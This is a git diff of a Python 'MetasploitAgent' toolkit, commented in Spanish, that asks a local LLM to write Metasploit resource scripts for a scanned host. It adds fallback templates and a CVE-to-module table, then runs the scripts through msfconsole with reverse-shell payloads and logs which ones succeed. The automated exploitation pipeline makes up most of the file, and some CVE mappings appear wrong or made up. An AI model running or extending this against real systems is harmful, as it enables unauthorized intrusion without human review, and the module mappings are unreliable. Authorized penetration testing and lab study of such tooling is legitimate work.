@@ -5,12 +5,15 @@ import subprocess
 import requests
 from typing import Dict, List
 from datetime import datetime
+from requests.adapters import HTTPAdapter
+from urllib3.util.retry import Retry
 
 from agno.tools.toolkit import Toolkit
 from agno.utils.log import logger
 
 import logging
 
+# Configuración de logging
 logger.setLevel(logging.DEBUG)
 results_dir = "/results"
 os.makedirs(results_dir, exist_ok=True)
@@ -20,7 +23,6 @@ file_handler.setLevel(logging.DEBUG)
 formatter = logging.Formatter('%(asctime)s [%(name)s] %(levelname)s: %(message)s')
 file_handler.setFormatter(formatter)
 logger.addHandler(file_handler)
-
 
 class MetasploitAgent(Toolkit):
     def __init__(self):
@@ -55,82 +57,54 @@ class MetasploitAgent(Toolkit):
             return "cmd/unix/reverse" if "http" in self.name.lower() else "generic/shell_reverse_tcp"
 
     def generate_exploit_llm(self, ip: str, port: str, service: str, os_info: str, vuln_id: str = None,
-                                 vulners: List[Dict] = None) -> str | None:
-            """Genera un script de Metasploit usando el LLM con instrucciones condicionales."""
-            vuln_prompt = f" para la vulnerabilidad {vuln_id}" if vuln_id else ""
-            vulners_info = f"Vulnerabilidades detectadas: {json.dumps(vulners)}" if vulners else "Sin vulnerabilidades específicas detectadas."
-            payload = self.get_payload(os_info)
-            file_cmd = "echo" if "unix" in payload or "linux" in payload else "echo."
-            file_path = f"/tmp/exploit_{vuln_id or 'generic'}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
-
-            prompt = f"""
-            Genera un script de Metasploit (.rc) para explotar un servicio {service} en {ip}:{port}{vuln_prompt} en un sistema {os_info}.
-            {vulners_info}
-            Usa un exploit conocido de Metasploit basado en la información proporcionada. Sigue estas instrucciones:
-            - Si el servicio es HTTP y el sistema es Linux, considera exploits como 'multi/http/apache_mod_cgi_bash_env_exec' o 'multi/http/php_cgi_arg_injection'.
-            - Si hay vulnerabilidades específicas (CVEs), elige un exploit relacionado (e.g., 'multi/http/dvwa_login_bypass' para DVWA).
-            - Si no hay coincidencias claras, usa un exploit genérico como 'multi/handler'.
-            - Incluye 'set TARGETURI' si el exploit lo requiere (e.g., '/cgi-bin/' para Apache CGI, '/' para otros).
-            - Configura:
-              - set RHOSTS {ip}
-              - set RPORT {port}
-              - set PAYLOAD {payload}
-              - set LHOST {self.lhost}
-              - set LPORT {self.lport}
-              - exploit
-            - Post-explotación: crea un archivo '{file_path}' con 'Exploited by Metasploit' usando '{file_cmd}'.
-            - Termina con 'exit'.
-            Devuelve solo el script.
-            """
-
-            try:
-                response = requests.post(self.ollama_url, json={"model": self.model, "prompt": prompt, "stream": False},
-                                         timeout=60)  # Aumentado a 60s como antes
-                response.raise_for_status()
-                script = response.json().get("response", "").strip()
-                if "use " in script and "exploit" in script:
-                    logger.debug(f"Script LLM generado para {vuln_id or 'generic'}: {script}")
-                    return script
-                logger.warning(f"Script LLM inválido para {vuln_id or 'generic'}, usando fallback")
-            except Exception as e:
-                logger.error(f"Error con LLM para {vuln_id or 'generic'}: {e}")
-
-            # Fallback mínimo
-            script = f"""
-    use multi/handler
-    set RHOSTS {ip}
-    set RPORT {port}
-    set PAYLOAD {payload}
-    set LHOST {self.lhost}
-    set LPORT {self.lport}
-    exploit
-    {file_cmd} 'Exploited by Metasploit' > {file_path}
-    exit
-    """
-            logger.info(f"Usando script de respaldo genérico")
-            return script
-
-    def generate_exploit_searchsploit(self, ip: str, port: str, service: str, os_info: str) -> List[str]:
-        """
-        Busca exploits con searchsploit y genera scripts básicos.
-        todo
-        Esto debería buscar a SearchsploitAgent.run() en vez de ejecutar esta lógica.
-        """
-        scripts = []
+                            vulners: List[Dict] = None) -> str | None:
+        """Genera un script de Metasploit usando el LLM con instrucciones condicionales."""
+        vuln_prompt = f" para la vulnerabilidad {vuln_id}" if vuln_id else ""
+        vulners_info = f"Vulnerabilidades detectadas: {json.dumps(vulners)}" if vulners else "Sin vulnerabilidades específicas detectadas."
         payload = self.get_payload(os_info)
         file_cmd = "echo" if "unix" in payload or "linux" in payload else "echo."
-        file_path = f"/tmp/exploit_searchsploit_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt" if "unix" in payload or "linux" in payload else f"C:\\exploit_searchsploit_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
+        file_path = f"/tmp/exploit_{vuln_id or 'generic'}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
+
+        prompt = f"""
+        Genera un script de Metasploit (.rc) para explotar un servicio {service} en {ip}:{port}{vuln_prompt} en un sistema {os_info}.
+        {vulners_info}
+        Usa un exploit conocido de Metasploit basado en la información proporcionada. Sigue estas instrucciones:
+        - Si el servicio es HTTP y el sistema es Linux, considera exploits como 'multi/http/apache_mod_cgi_bash_env_exec' o 'multi/http/php_cgi_arg_injection'.
+        - Si hay vulnerabilidades específicas (CVEs), elige un exploit relacionado (e.g., 'multi/http/dvwa_login_bypass' para DVWA).
+        - Si no hay coincidencias claras, usa un exploit genérico como 'multi/handler'.
+        - Incluye 'set TARGETURI' si el exploit lo requiere (e.g., '/cgi-bin/' para Apache CGI, '/' para otros).
+        - Configura:
+          - set RHOSTS {ip}
+          - set RPORT {port}
+          - set PAYLOAD {payload}
+          - set LHOST {self.lhost}
+          - set LPORT {self.lport}
+          - exploit
+        - Post-explotación: crea un archivo '{file_path}' con 'Exploited by Metasploit' usando '{file_cmd}'.
+        - Termina con 'exit'.
+        Devuelve solo el script.
+        """
 
         try:
-            cmd = ["searchsploit", "-j", service, f"port {port}"]
-            result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
-            if result.returncode == 0:
-                exploits = json.loads(result.stdout).get("RESULTS_EXPLOIT", [])
-                for exploit in exploits[:3]:  # Limitar a 3
-                    exploit_name = exploit["Title"].lower().replace(" ", "_")
-                    logger.info(f"[+] Exploit encontrado en searchsploit: {exploit_name}")
-                    script = f"""
-use exploit/{exploit_name}
+            session = requests.Session()
+            retries = Retry(total=3, backoff_factor=1, status_forcelist=[429, 500, 502, 503, 504])
+            session.mount("http://", HTTPAdapter(max_retries=retries))
+            response = session.post(
+                self.ollama_url,
+                json={"model": self.model, "prompt": prompt, "stream": False},
+                timeout=120
+            )
+            response.raise_for_status()
+            script = response.json().get("response", "").strip()
+            if "use " in script and "exploit" in script:
+                logger.debug(f"Script LLM generado para {vuln_id or 'generic'}: {script}")
+                return script
+            logger.warning(f"Script LLM inválido para {vuln_id or 'generic'}, usando fallback")
+        except Exception as e:
+            logger.error(f"Error con LLM para {vuln_id or 'generic'}: {e}")
+
+        script = f"""
+use multi/handler
 set RHOSTS {ip}
 set RPORT {port}
 set PAYLOAD {payload}
@@ -140,22 +114,15 @@ exploit
 {file_cmd} 'Exploited by Metasploit' > {file_path}
 exit
 """
-                    scripts.append(script)
-            if not scripts:
-                logger.warning("[!] No se encontraron exploits en searchsploit")
-            return scripts
-        except Exception as e:
-            logger.error(f"[!] Error con searchsploit: {e}")
-            return []
+        logger.info(f"Usando script de respaldo genérico")
+        return script
 
-    def generate_exploit_vulners(self, ip: str, port: str, service: str, os_info: str, vulners: List[Dict]) -> List[
-        str]:
+    def generate_exploit_vulners(self, ip: str, port: str, service: str, os_info: str, vulners: List[Dict]) -> List[str]:
         """Genera scripts basados en vulners del JSON de Nmap."""
         scripts = []
-        # Mapeo simple de CVEs a exploits conocidos
         cve_to_exploit = {
             "CVE-2021-40438": "exploit/multi/http/apache_mod_cgi_bash_env_exec",
-            "CVE-2023-25690": "exploit/multi/http/apache_requisition",  # Ejemplo, verificar existencia
+            "CVE-2023-25690": "exploit/multi/http/apache_requisition",
             "CVE-2022-22720": "exploit/multi/http/apache_http_server_rce"
         }
 
@@ -168,23 +135,22 @@ exit
                     file_cmd = "echo" if "unix" in payload or "linux" in payload else "echo."
                     file_path = f"/tmp/exploit_{vuln_id}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
                     script = f"""
-    use {exploit}
-    set RHOSTS {ip}
-    set RPORT {port}
-    set PAYLOAD {payload}
-    set LHOST {self.lhost}
-    set LPORT {self.lport}
-    exploit
-    {file_cmd} 'Exploited by Metasploit' > {file_path}
-    exit
-    """
+use {exploit}
+set RHOSTS {ip}
+set RPORT {port}
+set PAYLOAD {payload}
+set LHOST {self.lhost}
+set LPORT {self.lport}
+exploit
+{file_cmd} 'Exploited by Metasploit' > {file_path}
+exit
+"""
                     logger.info(f"[+] Script generado para {vuln_id} con exploit {exploit}")
-                    scripts.append(script)
+                    scripts.append({"script": script, "source": f"vulners_{vuln_id}", "exploit": exploit})
                 else:
-                    # Intentar con LLM como respaldo
                     script = self.generate_exploit_llm(ip, port, service, os_info, vuln_id)
                     if script:
-                        scripts.append(script)
+                        scripts.append({"script": script, "source": f"llm_{vuln_id}", "exploit": "unknown"})
         return scripts
 
     def run(self, **kwargs) -> Dict[str, str]:
@@ -207,7 +173,7 @@ exit
         port = target_data.get("port")
         service = target_data.get("service")
         os_info = target_data.get("os", "unknown")
-        vulners = nmap_data.get("tools", {}).get("metasploit", {}).get("vulners", [])  # Ajustado a tu estructura
+        vulners = nmap_data.get("tools", {}).get("metasploit", {}).get("vulners", [])
 
         if not all([ip, port, service]):
             logger.warning("Datos incompletos en 'target' para Metasploit")
@@ -216,12 +182,18 @@ exit
         target = f"{ip} {port} {service}"
         results = {}
 
-        # Generar scripts solo con LLM
-        scripts = [self.generate_exploit_llm(ip, port, service, os_info, None, vulners)]  # Script genérico
-        for vuln in vulners[:3]:  # Limitar a 3 vulnerabilidades
+        # Generar scripts: solo con LLM y vulners
+        scripts = []
+        # Script genérico con LLM
+        scripts.append({"script": self.generate_exploit_llm(ip, port, service, os_info, None, vulners), "source": "llm_generic", "exploit": "unknown"})
+        # Scripts por vulnerabilidad con LLM
+        for vuln in vulners[:3]:
             script = self.generate_exploit_llm(ip, port, service, os_info, vuln.get("id"), vulners)
             if script:
-                scripts.append(script)
+                scripts.append({"script": script, "source": f"llm_{vuln.get('id')}", "exploit": "unknown"})
+        # Scripts basados en vulners
+        vulners_scripts = self.generate_exploit_vulners(ip, port, service, os_info, vulners)
+        scripts.extend(vulners_scripts)
 
         if not scripts:
             logger.warning("No se generaron scripts de exploit")
@@ -229,11 +201,15 @@ exit
             return results
 
         # Ejecutar scripts
-        for idx, script in enumerate(scripts):
+        for idx, script_info in enumerate(scripts):
+            script = script_info["script"]
+            source = script_info["source"]
+            exploit_name = script_info.get("exploit", "unknown")
+
             try:
-                logger.info(f"Probando exploit {idx + 1}/{len(scripts)} para {target} (OS: {os_info})...")
+                logger.info(f"Probando exploit {idx + 1}/{len(scripts)} para {target} (OS: {os_info}, Source: {source}, Exploit: {exploit_name})...")
                 timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
-                script_path = f"{self.results_dir}/exploit_{ip}_{port}_{idx}_{timestamp}.rc"
+                script_path = f"{self.results_dir}/exploit_{ip}_{port}_{source}_{timestamp}.rc"
                 with open(script_path, "w") as f:
                     f.write(script)
                 logger.debug(f"Script guardado: {script_path}")
@@ -242,26 +218,84 @@ exit
                 process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
                 stdout, stderr = process.communicate(timeout=timeout)
 
-                output_path = f"{self.results_dir}/output_{ip}_{port}_{idx}_{timestamp}.txt"
+                output_path = f"{self.results_dir}/output_{ip}_{port}_{source}_{timestamp}.txt"
                 with open(output_path, "w") as f:
                     f.write(stdout + "\n" + stderr)
                 logger.info(f"Salida guardada en {output_path}")
 
                 if process.returncode == 0 and "Exploit completed" in stdout:
                     file_path = next((line.split("> ")[1] for line in script.split("\n") if "> " in line), "unknown")
-                    logger.info(f"Exploit {idx + 1} ejecutado con éxito en {target}")
-                    results[f"{target}_exploit_{idx}"] = f"Éxito: Archivo creado en {file_path}, salida en {output_path}"
+                    logger.info(f"Exploit {idx + 1} ejecutado con éxito en {target} (Source: {source})")
+                    results[f"{target}_exploit_{idx}"] = {
+                        "status": "success",
+                        "source": source,
+                        "exploit": exploit_name,
+                        "file_created": file_path,
+                        "output": output_path
+                    }
                 else:
-                    logger.error(f"Error en exploit {idx + 1} para {target}: {stderr or 'Sin detalles'}")
-                    results[f"{target}_exploit_{idx}"] = f"Error: {stderr or 'Sin detalles'}, salida en {output_path}"
+                    logger.error(f"Error en exploit {idx + 1} para {target} (Source: {source}): {stderr or 'Sin detalles'}")
+                    results[f"{target}_exploit_{idx}"] = {
+                        "status": "failed",
+                        "source": source,
+                        "exploit": exploit_name,
+                        "error": stderr or "Sin detalles",
+                        "output": output_path
+                    }
 
-                self.lport += 1  # Evitar conflictos
+                self.lport += 1
             except Exception as e:
-                logger.error(f"Error en exploit {idx + 1} para {target}: {e}")
-                results[f"{target}_exploit_{idx}"] = f"Error: {e}"
+                logger.error(f"Error en exploit {idx + 1} para {target} (Source: {source}): {e}")
+                results[f"{target}_exploit_{idx}"] = {
+                    "status": "failed",
+                    "source": source,
+                    "exploit": exploit_name,
+                    "error": str(e),
+                    "output": "N/A"
+                }
+
+        # Resumen de resultados
+        logger.info("=== Resumen de Explotación ===")
+        successful_exploits = []
+        failed_exploits = []
+
+        for key, result in results.items():
+            if isinstance(result, dict) and "status" in result:
+                if result["status"] == "success":
+                    successful_exploits.append({
+                        "target": key,
+                        "source": result["source"],
+                        "exploit": result["exploit"],
+                        "file_created": result["file_created"],
+                        "output": result["output"]
+                    })
+                else:
+                    failed_exploits.append({
+                        "target": key,
+                        "source": result["source"],
+                        "exploit": result["exploit"],
+                        "error": result["error"],
+                        "output": result["output"]
+                    })
+
+        logger.info("Exploits Exitosos:")
+        if successful_exploits:
+            for exploit in successful_exploits:
+                logger.info(f"- Target: {exploit['target']}, Source: {exploit['source']}, Exploit: {exploit['exploit']}, "
+                            f"Archivo Creado: {exploit['file_created']}, Salida: {exploit['output']}")
+        else:
+            logger.info("Ningún exploit fue exitoso.")
+
+        logger.info("Exploits Fallidos:")
+        if failed_exploits:
+            for exploit in failed_exploits:
+                logger.info(f"- Target: {exploit['target']}, Source: {exploit['source']}, Exploit: {exploit['exploit']}, "
+                            f"Error: {exploit['error']}, Salida: {exploit['output']}")
+        else:
+            logger.info("Ningún exploit falló.")
+        logger.info("=============================")
 
         return results
-
 
 if __name__ == "__main__":
     agent = MetasploitAgent()
